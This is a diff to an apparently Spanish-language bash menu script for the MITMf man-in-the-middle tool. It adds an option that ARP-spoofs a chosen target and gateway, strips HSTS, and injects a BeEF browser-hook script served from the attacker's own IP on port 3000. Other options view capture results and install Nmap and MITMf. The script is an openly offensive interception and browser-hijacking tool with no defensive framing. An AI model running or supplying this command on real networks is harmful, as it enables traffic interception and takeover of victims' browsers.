@@ -62,21 +62,22 @@ tput sgr0;
     echo "4) Seleccionar Interface"
     echo "5) Mostrar opciones"
     echo "6) MITMF"
-    echo "7) Resultado de la captura"
-    echo "8) Ver captura completa"
+    echo "7) MITMF + BeeF"
+    echo "8) Resultado de la captura"
+    echo "9) Ver captura completa"
     echo
-    echo "9) Instalar Nmap"
-    echo "10) Instalar MITMF (Repositorios)"
-    echo "11) Instalar MITMF (Github [Recomendado])"
+    echo "10) Instalar Nmap"
+    echo "11) Instalar MITMF (Repositorios)"
+    echo "12) Instalar MITMF (Github [Recomendado])"
     echo
-    echo "12) Salir"
+    echo "13) Salir"
     echo 
     echo -n "Indica una opcion: "
 }
 
 opc="0"
 
-until [ "$opc" -eq "12" ];
+until [ "$opc" -eq "13" ];
 
 do
     case $opc in
@@ -192,7 +193,23 @@ do
             _menu
             ;;
 
-          7)
+         7)
+            clear
+	    _logo
+            tput setaf 1;
+            echo
+            echo 
+            echo "MITMF attack + BeeF"
+            echo
+	    tput setaf 2;
+            echo "Inyectando hook... "
+            cd /root/MITMf #entramos en la carpeta donde se encuentra el programa (cambiar si esta en otra ruta)      
+            python mitmf.py --spoof --arp -i $interface --targets $IP_host --gateway $IP_gateway --hsts --inject --js-url http://$(ifconfig $interface |grep 'inet addr:'| cut -d: -f2|awk '{ print $1}'):3000/hook.js
+            pause
+            clear
+            _menu
+            ;;
+          8)
 
             clear
 	    _logo
@@ -212,7 +229,7 @@ do
             _menu
             ;;
 
-	  8)
+	  9)
 	    clear
 	    _logo
 	    echo
@@ -226,7 +243,7 @@ do
 	    _menu
 	    ;;
 
-	  9)
+	  10)
 	    clear
 	    _logo
 	    tput setaf 2;
@@ -239,7 +256,7 @@ do
             _menu
             ;;
 
-          10)
+          11)
             clear
 	    _logo
 	    tput setaf 2;
@@ -252,7 +269,7 @@ do
             _menu
             ;;
 
-          11)
+          12)
             clear
 	    _logo
 	    tput setaf 2;
